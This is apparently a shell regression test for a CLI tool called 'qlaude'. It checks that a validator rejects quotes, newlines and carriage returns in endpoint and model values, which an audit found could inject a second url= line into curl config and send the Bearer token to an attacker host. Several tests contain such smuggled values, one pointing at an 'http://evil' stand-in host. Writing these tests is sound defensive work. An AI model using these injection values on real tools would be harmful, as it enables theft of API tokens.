#!/bin/sh
# Audit a1-curl-config-injection (critical): QLAUDE_ENDPOINT/QLAUDE_MODEL are
# interpolated into `curl --config -` heredocs; a value containing a quote or
# a newline smuggles a second url= line and POSTs the Bearer token to an
# attacker host (reproduced live in the audit). Central validator: reject
# " CR LF in endpoint/model from ANY source — env, flag, config file.
set -u

here=$(cd "$(dirname "$0")" && pwd)
root=$(cd "$here/.." && pwd)
tool="$root/bin/qlaude"

fail=0
t() {
    if [ "$3" -eq 0 ]; then
        echo "PASS $1"
    else
        echo "FAIL $1"
        fail=1
    fi
}

tmp=$(mktemp -d) || { echo "validate test: mktemp -d failed" >&2; exit 2; }
trap 'rm -rf "$tmp"' EXIT
conf="$tmp/conf"
mkdir -p "$conf"
printf 'prompt body\n' >"$conf/SYSTEM-PROMPT.md"

mkconf() { # writes a valid file config with given endpoint/model
    printf 'QLAUDE_ENDPOINT=%s\nQLAUDE_MODEL=%s\nQLAUDE_TOKEN=tk-1\n' "$1" "$2" >"$conf/config.env"
    chmod 600 "$conf/config.env"
}

# 1. env-injected newline+quote in endpoint: refused as corrupted config.
mkconf 'http://127.0.0.1:1' 'm'
out=$(env -i PATH=/usr/bin:/bin HOME="$tmp" QLAUDE_CONFIG_DIR="$conf" \
    QLAUDE_ENDPOINT="$(printf 'http://127.0.0.1:1"\nurl = "http://127.0.0.1:2/s')" \
    sh "$tool" doctor 2>&1)
rc=$?
if [ "$rc" -eq 1 ] && printf '%s\n' "$out" | grep -q 'config corrupted'; then st=0; else st=1; fi
t "endpoint env value with quote+newline refused (exit 1, 'config corrupted')" 0 $st

# 2. quote in QLAUDE_MODEL env: refused (same sink in probe_models/step1).
out=$(env -i PATH=/usr/bin:/bin HOME="$tmp" QLAUDE_CONFIG_DIR="$conf" \
    QLAUDE_MODEL='m" url = "http://evil' sh "$tool" doctor 2>&1)
rc=$?
if [ "$rc" -eq 1 ] && printf '%s\n' "$out" | grep -q 'config corrupted'; then st=0; else st=1; fi
t "model env value with quote refused" 0 $st

# 3. CR smuggled in endpoint (curl-config line break too): refused.
out=$(env -i PATH=/usr/bin:/bin HOME="$tmp" QLAUDE_CONFIG_DIR="$conf" \
    QLAUDE_ENDPOINT="$(printf 'http://127.0.0.1:1\rx')" sh "$tool" doctor 2>&1)
rc=$?
if [ "$rc" -eq 1 ] && printf '%s\n' "$out" | grep -q 'config corrupted'; then st=0; else st=1; fi
t "endpoint env value with CR refused" 0 $st

# 4. file-sourced quote in endpoint: refused too (the line parser keeps
# quotes verbatim; the sink must not).
mkconf 'http://127.0.0.1:1" x' 'm'
out=$(env -i PATH=/usr/bin:/bin HOME="$tmp" QLAUDE_CONFIG_DIR="$conf" \
    sh "$tool" doctor 2>&1)
rc=$?
if [ "$rc" -eq 1 ] && printf '%s\n' "$out" | grep -q 'config corrupted'; then st=0; else st=1; fi
t "endpoint value from config.env with quote refused" 0 $st

# 5. anti-vacuous control: clean values are NOT rejected with exit 1.
mkconf 'http://127.0.0.1:1' 'my-model'
env -i PATH=/usr/bin:/bin HOME="$tmp" QLAUDE_CONFIG_DIR="$conf" \
    sh "$tool" doctor >/dev/null 2>&1
rc=$?
if [ "$rc" -ne 1 ]; then st=0; else st=1; fi
t "  anti-vacuous: clean config passes validation (rc=$rc, not 1-corrupted)" 0 $st

# 6. setup --endpoint with a quote: refused BEFORE saving (no poisoned file).
rm -f "$conf/config.env"
out=$(env -i PATH=/usr/bin:/bin HOME="$tmp" QLAUDE_CONFIG_DIR="$conf" \
    QLAUDE_MODEL=m QLAUDE_TOKEN=tk sh "$tool" setup -y \
    --endpoint 'http://127.0.0.1:1" y' </dev/null 2>&1)
rc=$?
if [ "$rc" -ne 0 ] && [ ! -f "$conf/config.env" ]; then st=0; else st=1; fi
t "setup refuses quote-bearing --endpoint and saves nothing" 0 $st

exit "$fail"
